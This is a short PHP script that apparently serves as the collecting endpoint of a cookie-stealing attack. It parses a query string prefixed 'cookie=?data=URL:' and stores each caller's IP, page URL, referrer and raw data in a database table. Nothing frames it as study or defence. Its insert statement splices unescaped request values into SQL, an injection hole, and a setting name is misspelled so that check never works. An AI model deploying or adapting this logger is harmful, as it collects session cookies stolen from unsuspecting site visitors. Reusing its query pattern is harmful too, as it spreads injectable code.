<?php
error_reporting(0);
require_once('config.php');
require_once('inc/functions.php');

$RAW = rawurldecode($_SERVER['QUERY_STRING']);
$RAW=  str_replace("cookie=?data=URL: ", "", $RAW);
$htpp=substr_startswith($RAW, "http");
if (empty($htpp) && !$htpp) {
    die('');
}
$URL_TMP=  explode("\n", $RAW);
$URL=  getURL($URL_TMP[0]);
if(empty($URL)){
    die('');
}
$register_globals = (bool) ini_get('register_gobals');
if ($register_globals) {
    $ip = getenv('REMOTE_ADDR');
} else {
    $ip = GetIP();
}




mysql_c($settings['mysql']['server'], $settings['mysql']['username'], $settings['mysql']['password'], $settings['mysql']['database']);


$REFER = $_SERVER['HTTP_REFERER']; //Refer Page
$date = date("Y-m-d H:i:s", time()); //Date
mysql_q("insert into users (`IP`,`URL`,`URL_REF`,`DATE`,`RAW`) VALUES "
        . "('$ip','$URL','$REFER','$date','$RAW');");
